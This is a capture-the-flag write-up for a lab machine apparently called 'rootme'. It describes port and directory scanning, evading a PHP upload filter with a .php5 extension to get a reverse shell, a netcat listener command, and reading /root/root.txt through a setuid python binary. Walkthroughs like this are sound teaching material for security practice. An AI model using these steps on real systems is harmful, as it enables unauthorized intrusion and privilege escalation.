## Reconnaissance

Results of nmap scan:

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times
will be slower.

```

We see that port 22 and 80 are open. The web server is running Apache version
2.4.29. 

I navigated to the web server in my browser and did not find anything
interesting in the source code or within robots.txt file. Time to run gobuster
to search for hidden directories.

## Exploitation

From the gobuster scan we see there are a /panel and /uploads folder. We can
upload files in /panel and they will be saved in /uploads. Meaning, we can
easily get a reverse shell!

I tried uploading a .pl (perl) and .php reverse shell, but the former did not
run and the latter is blocked by a blacklist filter.

After reading this post [on bypassing file upload
restrictions](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/)
I found a solution.

I editted my php reverse shell to have a .php5 file extension and was able to
get a reverse shell.

```
$ mv php-revshell.php php-revshell.php5
```

```
$ nc -nlvp 4444                                      
listening on [any] 4444 ...

$ 
```

## Finding user.txt

From here is was simple to find the user flag:

```
$ find / -iname "user.txt" 2>/dev/null 
/var/www/user.txt
$ cd /var/www
$ ls -la
total 20
drwxr-xr-x  3 www-data www-data 4096 Aug  4  2020 .
drwxr-xr-x 14 root     root     4096 Aug  4  2020 ..
-rw-------  1 www-data www-data  129 Aug  4  2020 .bash_history
drwxr-xr-x  6 www-data www-data 4096 Aug  4  2020 html
-rw-r--r--  1 www-data www-data   21 Aug  4  2020 user.txt
$ cat user.txt
XXX-REDACTED-XXX
```

## Privilege Escalation

First I [stabilized my reverse
shell](https://jasonturley.xyz/how-to-stabilize-a-reverse-shell/) so it's not as wonky.

Search for files that have the setuid bit set:

```
www-data@rootme:/var/www$ find / -perm -u=s -type f 2>/dev/null
```

There's a ton of output, but the file that immediately stood out to me was
/usr/bin/python.

Using [this GTFObin
syntax](https://gtfobins.github.io/gtfobins/python/#file-read) we can read the
root file!

```
www-data@rootme:/var/www$ python -c 'print(open("/root/root.txt").read())'
XXX-REDACTED-XXX
```

That was a fun box!
